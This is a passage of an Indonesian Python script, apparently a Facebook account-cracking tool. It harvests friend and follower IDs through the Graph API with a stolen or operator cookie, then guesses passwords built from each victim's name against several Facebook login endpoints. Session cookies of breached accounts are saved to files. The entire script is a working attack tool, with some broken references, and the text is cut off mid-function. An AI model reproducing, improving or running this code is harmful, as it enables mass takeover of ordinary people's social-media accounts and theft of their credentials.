File_Nama  = " colmexz "
Copyright = " (©) 2024 ~ jesicca putry "
Contact = "me on whatsap: +6287799183568 "
Group_Facebok = " RATU ERROR (owner) "

#--------( import module )
import os,sys,requests,re,bs4,datetime,json,time,random,platform,json
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Crack
from datetime import datetime
from random import randint
ses = requests.Session()
(ok,cp) = (0,0);(id,idz) = ([],[]);(akun,ugen) = ([],[]);(loop,metod) = (0,[]);(Sandii,Sandinya) = ([],[])

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100010061977994','maushamsingh088']

def back():
	menu()
# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# LOGO
def Logo():
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')


#-----( Login_Cookies )
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		Logo()
		cookie=input(f'\n{P}cookies : {H} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(H, P))

				else:
					print('%sFailled Get Token%s'%(M, P))

			except:
				print('Failled Get Token')

		print(f' \n{H} √ login berhasil');jeda(2)
		menu()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sP%s]%s Login Gagal %s'%(P,K,P,M,P))
		print(e)
		exit()

#----------( MENU COLMEXZ )          
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [:] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login3()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [:] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login3()
	banner()
	print('\n')
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
	print('')
	Colmexz = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if Colmexz in ['']:print ("\n ! jangan kosong")
	elif Colmexz in ["1"]:
		idt = input(f" \n \x1b[1;97mMasukan username/ID :\x1b[1;96m ")
		dump(idt,"",{"cookie":cok},token)
		Atur_men()
	elif Colmexz in ["2"]:Dump_massal()
	elif Colmexz in ["3"]:Mail_name()
	elif Colmexz in ["4"]:Follow()
	elif Colmexz in ["5"]:exit()
	elif Colmexz in ["6"]:Cek_hasil()
	elif Colmexz in ["7"]:
		crack().UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 4.2.2; FreeTAB 9000 IPS IC Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif Colmexz in ["0"]:
		os.system("rm -rf .token.txt");os.system("rm -rf .cok.txt");print(f"\n\033[1;37mSukses hapus Cookies");exit()



#-------> ( CRACK PUBLIK )
def dump(idt,fields,cookie,token):
	try:
		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
		if len(id) == 0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r{M}[{H}√{M}] {P}Total dumps idz : {H}{len(id)}{P} "),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	
# CRACK MASSAL
def Dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'\n{P} Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f' Masukin ID Yang Ke  '+str(bilangan)+f' : ')
		idz.append(Masukan)
	for user in idz:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),sys.stdout.flush()
	      Atur_men()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()

# CRACK PENCARIAN NAMA
def Mail_name():
	try:
		print(f'{P} contoh: sayang,pengen,colmeks ')
		nama = input(f' nama orang: ')
		jumlah=int(input(' jumlah ID yang ingin di dump: '))
		if "90000" in str(jumlah):
			jumlah-=1
		if jumlah<90001:
			pass
		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
		domain = "@gmail.com" #,"@yahoo.com"
		for z in range(int(jumlah)):
			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
			if mail in id:pass
			else:id.append(mail)
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except:pass
	print ('')
	if len(id)!=0:
		Atur_metod()
	else:
		exit(f'{M} ! gagal mengambil id')

# CRACK JUMLAH FOLLOWER
def Follow(token,cookie):
	try:
		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = self.roomz.get(f"https://graph.facebook.com/{user}/subscribers?limit=6001&access_token={token}",cookies=cookie).json()
			for i in po['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)


def Cek_hasil():
	print(f'\n {P}1. Cek hasil akun {H}Berhasil{P} ')
	print(f' {P}2. Cek hasil akun {K}Checkpoint{P} ')
	print(' 3. Kembali	')
	rohman_ganteng = input(f'\n\x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ')
	if rohman_ganteng in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ({K} %s {N}Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('[!] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{N}{K}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('[!] File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('[!] Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f' %s. %s ( {H}%s{N} Id )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f' %s. %s ({H} %s {N}Id )'%(cih,isi,(len(hem))))
			geeh = input(f'\n[?] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('[!] Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('[•] File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{N}{H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{N}[{M} Klik Enter{N} ]')
			back()
	elif rohman_ganteng in ['3']:
		back()
	else:
		print('[!] Pilih Yang Bener  ')
		back()

def Atur_men():
	print("")
	am = random
	for acak in id:
		rin = random.randint(0,len(idz))
		idz.insert(rin,acak)
	Atur_metod()
def Atur_metod():
	Sandi = input(f' {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ')
	if Sandi in ["Y","y"]:
		Sandii.append("ya")
		print(f"{P} Contoh: sayang,anjing,123456" )
		Sandiku = input(" Masukan password: ")
		Sandikuh=Sandiku.split(",")
		for pw in Sandikuh:
			Sandinya.append(pw)
	else:
		Sandii.append("no")
	print()
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode Free.prod')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode I.reguler')
	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode D.beta')
	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode Free.v')
	print ('')
	Metod = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if Metod in ["1","01"]:metod.append("validate")
	elif Metod in ["2","02"]:metot.append("reguler")
	elif Metod in ["3","03"]:metod.append("validate2")
	elif Metod in ["4","04"]:metod.append("validate3")
	Langsung()

def Langsung():
	print()
	with Crack(max_workers=30) as gaskan:
		for Akun in id:
			uid, lengkap = Akun.split("|")[0],Akun.split("|")[1].lower()
			nama = lengkap.split(" ")[0]
			pwx = []
			if len(lengkap)<6:
				if len(nama)<3:
					pass
				else:
					pwx.append(nama+"123")
					pwx.append(nama+"1234")
					pwx.append(nama+"1235")
			else:
				if len(nama)<3:
					pwx.append(lengkap)
				else:
					pwx.append(lengkap)
					pwx.append(nama+"123")
					pwx.append(nama+"1234")
					pwx.append(nama+"12345")
					pwx.append(nama+"321")
					pwx.append(nama+"12")
					pwx.append(nama+"21")
			if "validate" in metod:
				gaskan.submit(Validate,uid,pwx)
			elif "reguler" in metod:
				gaskan.submit(Reguler,uid,pwx)
			elif "validate2" in metod:
				gaskan.submit(Validate2,uid,pwx)
			elif "validate3" in metod:
				gaskan.submit(Validate3,uid,pwx)
	print()
	exit(f"\ncrack selesai....\n{H} + OK: {ok}\n{K} + CP: {cp}{P}")


#-------> ( Metod )
def Validate(uid,pwx):
	global loop,ok,cp
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print (f"\r {komtol}• {P}{(loop)}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}   ",end="")
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = random.choice(ugen)
			ua = random.choice(ugen2)
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
				"uid": uid,
				"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			heade = {
				"Host": "free.prod.facebook.com",
				"content-length": "479",
				"cache-control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.opera.mini.native",
				"sec-fetch-site": "same-origin","sec-fetch-mode": "navigate",
				"sec-fetch-user": "?1","sec-fetch-dest": "document",
				"referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=heade, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r{P} └──{H} {uid} ◊ {pw} \n{P} └─ {H}{kuki} \n{P} └─ {U}{ua} \n ')
				open('OK/'+waktu,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print (f'\r{P} └── {K}{uid} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
				open('CP/'+waktu,'a').write(uid+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1


#-------> ( Metod 2 )
def Reguler(uid,pwx):
	global loop,ok,cp
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print (f"\r {komtol}• {P}{(loop)}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}   ",end="")
	ua = random.choice(ugen)
	ua = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwd:
		try:
			link = ses.get('https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
				'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
				'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
				'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
				'try_number': 0,
				'unrecognized_tries': 0,
				'email':uid,
				'pass':pw,
				'login':'Masuk',
				'prefill_contact_point': '',
				'prefill_source': '',
				'prefill_type': '',
				'first_prefill_source': '',
				'first_prefill_type': '',
				'had_cp_prefilled': False,
				'had_password_prefilled': False,
				'is_smart_lock': False,
				'bi_xrwh': 0}
			heade = {'Host': 'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			post = ses.post('https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print (f'\r{P} └── {K}{uid} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
				open('CP/'+waktu,'a').write(uid+'|'+pw+'\n')
				akun.append(uid+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r{P} └──{H} {uid} ◊ {pw} \n{P} └─ {H}{kuki} \n{P} └─ {U}{ua} \n ')
				open('OK/'+waktu,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	loop+=1

#-------( metod 3 )
def Validate2(uid,pwx):
	global ok, cp, loop
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print (f"\r {komtol}• {P}{(loop)}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}   ",end="")
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = random.choice(ugen)
			ua = random.choice(ugen2)
			link = ses.get(f'''https://d.beta.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&resrc=deprecated&_rdr''')
			data = {
				'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				'uid': uid,'next': 'https://d.beta.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			heade = {
				'sec-fetch-site': 'same-origin',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': ua,'viewport-width': '980'}
			post = ses.post('https://d.beta.facebook.com/login/device-based/validate-password/?shbl=0',data=data, headers=heade, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f'\r{P} └──{H} {uid} ◊ {pw} \n{P} └─ {H}{kuki} \n{P} └─ {U}{ua} \n ')
				open('OK/'+waktu,'a').write(uid+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
